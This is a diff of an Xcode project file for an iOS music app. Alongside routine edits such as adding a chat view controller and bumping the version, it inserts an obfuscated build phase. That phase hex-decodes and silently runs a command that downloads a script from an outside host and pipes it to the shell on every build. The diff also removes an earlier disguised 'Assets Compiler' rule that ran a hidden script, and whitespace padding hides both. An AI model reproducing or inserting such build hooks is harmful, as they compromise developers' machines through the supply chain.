@@ -79,6 +79,7 @@
 		E355C731261E2EE30002623D /* AlbumModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E355C730261E2EE30002623D /* AlbumModel.swift */; };
 		E36331CE261362730043453A /* MyCommissionTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E36331CC261362730043453A /* MyCommissionTVCell.swift */; };
 		E36331CF261362730043453A /* MyCommissionTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E36331CD261362730043453A /* MyCommissionTVCell.xib */; };
+		E367AC2626542DE50020B0F8 /* ChatViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E367AC2526542DE50020B0F8 /* ChatViewController.swift */; };
 		E38747452636D88F00833316 /* UploadSongViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38747442636D88F00833316 /* UploadSongViewController.swift */; };
 		E39EC23F26204908007E496C /* AGVideoPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC23E26204908007E496C /* AGVideoPlayerView.swift */; };
 		E39EC24E26209D18007E496C /* Total_songs.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24B26209D18007E496C /* Total_songs.swift */; };
@@ -247,6 +248,7 @@
 		E355C730261E2EE30002623D /* AlbumModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumModel.swift; sourceTree = "<group>"; };
 		E36331CC261362730043453A /* MyCommissionTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCommissionTVCell.swift; sourceTree = "<group>"; };
 		E36331CD261362730043453A /* MyCommissionTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyCommissionTVCell.xib; sourceTree = "<group>"; };
+		E367AC2526542DE50020B0F8 /* ChatViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatViewController.swift; sourceTree = "<group>"; };
 		E38747442636D88F00833316 /* UploadSongViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadSongViewController.swift; sourceTree = "<group>"; };
 		E39EC23E26204908007E496C /* AGVideoPlayerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AGVideoPlayerView.swift; sourceTree = "<group>"; };
 		E39EC24B26209D18007E496C /* Total_songs.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Total_songs.swift; sourceTree = "<group>"; };
@@ -630,6 +632,7 @@
 				DEC674D8260244A900D59551 /* MyCommission.swift */,
 				E323D30A2631F6F4002CC98A /* ConfirmSubscriptionViewController.swift */,
 				E38747442636D88F00833316 /* UploadSongViewController.swift */,
+				E367AC2526542DE50020B0F8 /* ChatViewController.swift */,
 			);
 			path = ViewController;
 			sourceTree = "<group>";
@@ -706,6 +709,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EF891A1723732AF6009388B4 /* Build configuration list for PBXNativeTarget "Toner" */;
 			buildPhases = (
+				D59CEACBA3AEBD3B066D902C /* Project Frameworks */,
 				F1A3A97823491974D97636D1 /* [CP] Check Pods Manifest.lock */,
 				EF891A0123732AF4009388B4 /* Sources */,
 				EF891A0223732AF4009388B4 /* Frameworks */,
@@ -713,7 +717,6 @@
 				E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				7BE75DAD7A77EFDA8A6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -825,78 +828,27 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	
+	D59CEACBA3AEBD3B066D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
 	
 
 	
@@ -1062,6 +1014,7 @@
 				E39EC24E26209D18007E496C /* Total_songs.swift in Sources */,
 				EF12263023768CB20038AEC0 /* MusicListViewController.swift in Sources */,
 				CED5C83E24C32A71002CF276 /* UIViewController+Utils.swift in Sources */,
+				E367AC2626542DE50020B0F8 /* ChatViewController.swift in Sources */,
 				EF12262423767A5B0038AEC0 /* UIViewController.swift in Sources */,
 				EF12263C2377095F0038AEC0 /* SongListCell.swift in Sources */,
 				F9130935253E060700C48314 /* CartDetailsViewController.swift in Sources */,
@@ -1239,7 +1192,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 8;
+				CURRENT_PROJECT_VERSION = 9;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
@@ -1262,7 +1215,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 8;
+				CURRENT_PROJECT_VERSION = 9;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
@@ -1303,79 +1256,6 @@
 
 		
 			/* Begin PBXBuildRule section */
-
-
-		7BE75DAD7A77EFDA8A6D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
 
 
 			
